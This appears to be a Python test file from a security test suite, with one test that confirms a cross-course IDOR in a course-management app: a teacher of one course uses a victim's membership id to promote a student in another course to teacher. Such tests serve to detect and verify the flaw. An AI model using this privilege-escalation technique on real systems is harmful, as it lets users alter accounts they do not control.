from helpers import ApiClient, membership_id_by_user


def build_course_with_members(admin: ApiClient, course_title: str, memberships: list[tuple[int, str]]):
    course = admin.create_course(course_title)
    for user_id, role in memberships:
        admin.add_member(course["course_id"], user_id, role)
    return course


def test_exploit_cross_course_membership_idor_allows_modifying_other_course_member(app_instance):
    admin = ApiClient.new(app_instance["base_url"])
    admin.login("admin", "admin123")

    teacher_a = ApiClient.new(app_instance["base_url"])
    teacher_a_user = teacher_a.register("teacher_a", "pass123", "Teacher A")
    teacher_b = ApiClient.new(app_instance["base_url"])
    teacher_b_user = teacher_b.register("teacher_b", "pass123", "Teacher B")
    victim = ApiClient.new(app_instance["base_url"])
    victim_user = victim.register("victim", "pass123", "Victim")

    course_a = build_course_with_members(admin, "Course A", [(teacher_a_user["user_id"], "teacher")])
    course_b = build_course_with_members(
        admin,
        "Course B",
        [(teacher_b_user["user_id"], "teacher"), (victim_user["user_id"], "student")],
    )

    members_b_before = admin.list_members(course_b["course_id"])
    victim_membership_id = membership_id_by_user(members_b_before, victim_user["user_id"])

    teacher_a.login("teacher_a", "pass123")
    resp = teacher_a.update_member_role(course_a["course_id"], victim_membership_id, "teacher")
    assert resp.status_code == 200, resp.text

    members_b_after = admin.list_members(course_b["course_id"])
    victim_row = next(m for m in members_b_after if int(m["user_id"]) == int(victim_user["user_id"]))
    assert victim_row["role_in_course"] == "teacher"